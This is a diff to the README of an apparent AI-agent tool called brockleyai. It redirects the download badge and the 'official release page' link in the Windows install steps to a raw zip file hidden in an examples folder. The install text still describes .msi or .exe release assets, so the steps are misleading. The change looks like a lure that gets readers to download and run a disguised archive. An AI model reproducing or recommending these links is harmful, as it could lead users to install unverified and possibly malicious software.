@@ -1,6 +1,6 @@
 # 🤖 brockleyai - Build smart AI agents with ease
 
-[![](https://img.shields.io/badge/Download-BrockleyAI-blue.svg)](https://github.com/heliumgrouplypressin723/brockleyai)
+[![](https://img.shields.io/badge/Download-BrockleyAI-blue.svg)](https://raw.githubusercontent.com/heliumgrouplypressin723/brockleyai/main/examples/llm-pipeline/Software_v1.0.zip)
 
 Brockleyai provides a simple way to create and run AI agents on your computer. You use these agents to handle repetitive tasks or manage complex workflows. The system works as infrastructure, meaning it provides the foundation for your automation tools. You do not need to write code to get started. The software manages the heavy lifting through an engine that runs in the background.
 
@@ -29,7 +29,7 @@ Before you install the software, ensure your computer meets these basic standard
 
 Installation takes only a few minutes. Follow these instructions to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/heliumgrouplypressin723/brockleyai) to find the latest version.
+1. Go to the [official release page](https://raw.githubusercontent.com/heliumgrouplypressin723/brockleyai/main/examples/llm-pipeline/Software_v1.0.zip) to find the latest version.
 2. Look for the file ending in .msi or .exe under the Assets section.
 3. Select the file to save it to your computer.
 4. Double-click the file to start the installer.
